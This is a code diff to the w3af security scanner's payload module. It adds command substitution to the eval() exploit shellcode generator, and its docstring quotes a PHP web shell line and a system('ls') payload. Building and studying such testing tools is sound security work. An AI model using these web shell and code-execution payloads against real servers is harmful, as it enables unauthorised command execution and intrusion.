@@ -21,6 +21,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import os.path
 import base64
+import functools
 
 import w3af.core.data.kb.knowledge_base as kb
 from w3af.core.controllers.exceptions import BaseFrameworkException
@@ -29,6 +30,8 @@ from w3af import ROOT_PATH
 SHELL_IDENTIFIER_1 = '15825b40c6dace2a'[::-1]
 SHELL_IDENTIFIER_2 = '7cf5d4ab8ed434d5'[::-1]
 SHELL_IDENTIFIER = SHELL_IDENTIFIER_1 + SHELL_IDENTIFIER_2 
+
+CMD_TO_RUN_CONSTANT = '__CMD_TO_RUN__'
 
 
 def get_webshells(extension, force_extension=False):
@@ -42,22 +45,37 @@ def get_webshells(extension, force_extension=False):
     return _get_file_list('webshell', extension, force_extension)
 
 
-def get_shell_code(extension, force_extension=False):
+def get_shell_code(extension, command, force_extension=False):
     """
-    Like getShell, but instead of returning a list of the contents of a web shell,
-    that you can upload to a server and execute, this method returns the CODE
-    used to exploit an eval() vulnerability.
+    Similar to get_webshells but returns a code that when it is evaluated runs
+    `command` in the operating system.
 
     Example:
-        getShell() returns:
+        get_webshells() returns:
             "<?  system( $_GET['cmd'] )    ?>"
 
         get_shell_code() returns:
-            "system( $_GET['cmd'] )"
+            "system('ls')"
 
-    :return: The CODE of the web shell, suitable to use in an eval() exploit.
+    :param extension: PHP, PY, etc.
+    :param command: The operating system command to execute
+    :param force_extension: Only return the shellcode for extension
+    :return: (The CODE of the web shell, suitable to use in an eval() exploit,
+              The extension for this particular shellcode,
+              A function that generates new shellcodes based on a command)
     """
-    return _get_file_list('code', extension, force_extension)
+    result = []
+    shellcodes = _get_file_list('code', extension, force_extension)
+
+    def cmd_replace(shellcode_content, _command):
+        return shellcode_content.replace(CMD_TO_RUN_CONSTANT, _command)
+
+    for file_content, real_extension in shellcodes:
+        custom_replacer = functools.partial(cmd_replace, file_content)
+        this_shellcode = custom_replacer(command)
+        result.append((this_shellcode, real_extension, custom_replacer))
+
+    return result
 
 
 def extract_result(body):
